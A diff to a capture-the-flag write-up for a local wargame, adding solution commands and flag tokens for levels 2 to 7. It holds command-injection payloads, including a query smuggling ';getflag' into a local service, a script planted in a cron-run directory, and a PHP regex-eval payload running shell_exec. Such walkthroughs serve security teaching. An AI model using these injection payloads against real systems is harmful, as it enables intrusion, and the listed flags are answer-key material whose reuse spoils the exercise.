@@ -34,7 +34,7 @@ _EOF
 ## Level02
 
 ```
-scp -P <port> level02@localhost:/home/user/level02/level02.pcap /tmp
+scp -P <port> level02@127.0.0.1:~/level02.pcap /tmp
 chmod u+r /tmp/level02.pcap
 ```
 -> wireshark -> follow TCP stream  
@@ -56,7 +56,8 @@ ln -s /bin/getflag /tmp/echo
 ## Level04
 
 ```
-curl 'localhost:4747?x=a%3Bgetflag'
+cat ~/level04.pl
+curl --get --data-urlencode 'x=a;getflag' localhost:4747
 ```
 
 > `qi0maab88jeaj46qoumi7maus`
@@ -64,6 +65,7 @@ curl 'localhost:4747?x=a%3Bgetflag'
 ## Level05
 
 ```
+cat /var/mail/level05
 cat <<_EOF > /opt/openarenaserver/level05.sh
 #!/bin/sh
 getflag >/tmp/flag.txt 2>&1
@@ -74,6 +76,23 @@ watch -n 1 cat /tmp/flag.txt
 
 ## Level06
 
+```
+php --version
+```
+[PHP - Documentation for PHP 5](https://www.php.net/manual/php5.php)  
+[PHP 5 - PCRE Patterns - Pattern Modifiers - eval](https://php-legacy-docs.zend.com/manual/php5/en/reference.pcre.pattern.modifiers#reference.pcre.pattern.modifiers.eval)  
+[PHP 5 - Process Control Extensions - System program execution](https://php-legacy-docs.zend.com/manual/php5/en/book.exec)  
+```
+cat <<_EOF >/tmp/level06.txt
+[x {\${shell_exec(\$z)}}]
+_EOF
+~/level06 /tmp/level06.txt getflag
+```
+
 > `viuaaale9huek52boumoomioc`
+
+## Level07
+
+> `wiok45aaoguiboiki2tuin6ub`
 
 
